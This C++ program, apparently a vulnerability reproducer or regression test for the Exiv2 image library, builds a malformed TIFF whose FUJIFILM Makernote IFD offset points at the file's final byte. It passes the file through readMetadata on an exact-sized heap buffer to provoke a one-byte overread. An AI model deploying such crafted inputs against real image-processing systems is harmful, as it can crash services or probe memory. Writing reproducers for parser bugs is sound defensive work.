// Crafted little-endian TIFF: FUJIFILM Makernote whose IFD offset lands on the
// final byte of the file. Public entry point is Image::readMetadata.
#include <exiv2/exiv2.hpp>

#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <vector>

namespace {

void append16(std::vector<Exiv2::byte>& b, uint16_t v) {
  b.push_back(static_cast<Exiv2::byte>(v & 0xff));
  b.push_back(static_cast<Exiv2::byte>((v >> 8) & 0xff));
}

void append32(std::vector<Exiv2::byte>& b, uint32_t v) {
  b.push_back(static_cast<Exiv2::byte>(v & 0xff));
  b.push_back(static_cast<Exiv2::byte>((v >> 8) & 0xff));
  b.push_back(static_cast<Exiv2::byte>((v >> 16) & 0xff));
  b.push_back(static_cast<Exiv2::byte>((v >> 24) & 0xff));
}

void append_entry(std::vector<Exiv2::byte>& b, uint16_t tag, uint16_t type, uint32_t count, uint32_t value) {
  append16(b, tag);
  append16(b, type);
  append32(b, count);
  append32(b, value);
}

// Build a TIFF whose Fuji Makernote value ends at EOF and whose IFD offset
// selects the last byte of that value (one byte short of a 16-bit count).
std::vector<Exiv2::byte> craft() {
  std::vector<Exiv2::byte> b;
  b.reserve(128);

  // TIFF header. IFD0 begins immediately after it.
  b.push_back('I');
  b.push_back('I');
  append16(b, 42);
  append32(b, 8);

  // IFD0: Make + ExifIFD.
  append16(b, 2);
  const size_t make_entry = b.size();
  append_entry(b, 0x010f, 2, 9, 0);  // ASCII "FUJIFILM\0", offset patched below
  const size_t exif_entry = b.size();
  append_entry(b, 0x8769, 4, 1, 0);  // LONG, offset patched below
  append32(b, 0);                    // next IFD

  const uint32_t make_at = static_cast<uint32_t>(b.size());
  const char make[] = "FUJIFILM";
  b.insert(b.end(), make, make + 8);
  b.push_back(0);

  const uint32_t exif_at = static_cast<uint32_t>(b.size());
  append16(b, 1);  // one Exif entry
  const size_t mn_entry = b.size();
  append_entry(b, 0x927c, 7, 30, 0);  // UNDEFINED MakerNote, offset patched below
  append32(b, 0);

  const uint32_t mn_at = static_cast<uint32_t>(b.size());
  // Fuji header: signature + uint32 IFD offset, then padding so the value is
  // 30 bytes (header + one IFD entry), which is what the reader requires.
  const char sig[] = "FUJIFILM";
  b.insert(b.end(), sig, sig + 8);
  // Point the IFD at the last byte of the Makernote value / file.
  const uint32_t ifd_offset = 29;
  append32(b, ifd_offset);
  b.resize(b.size() + 18, 0);

  auto patch32 = [&b](size_t at, uint32_t v) {
    b[at] = static_cast<Exiv2::byte>(v & 0xff);
    b[at + 1] = static_cast<Exiv2::byte>((v >> 8) & 0xff);
    b[at + 2] = static_cast<Exiv2::byte>((v >> 16) & 0xff);
    b[at + 3] = static_cast<Exiv2::byte>((v >> 24) & 0xff);
  };
  // value/offset field is the last 4 bytes of each 12-byte entry
  patch32(make_entry + 8, make_at);
  patch32(exif_entry + 8, exif_at);
  patch32(mn_entry + 8, mn_at);

  if (mn_at + ifd_offset + 1 != b.size()) {
    std::cerr << "layout error\n";
    std::exit(2);
  }
  return b;
}

}  // namespace

int main() {
  const auto file = craft();
  // Exact-sized allocation so a one-byte overread leaves the object.
  auto* data = static_cast<Exiv2::byte*>(std::malloc(file.size()));
  if (!data)
    return 1;
  std::memcpy(data, file.data(), file.size());

  try {
    auto image = Exiv2::ImageFactory::open(data, file.size());
    if (image)
      image->readMetadata();
  } catch (const Exiv2::Error&) {
    // Corruption that the library reports is not the fault under test.
  }

  std::free(data);
  return 0;
}
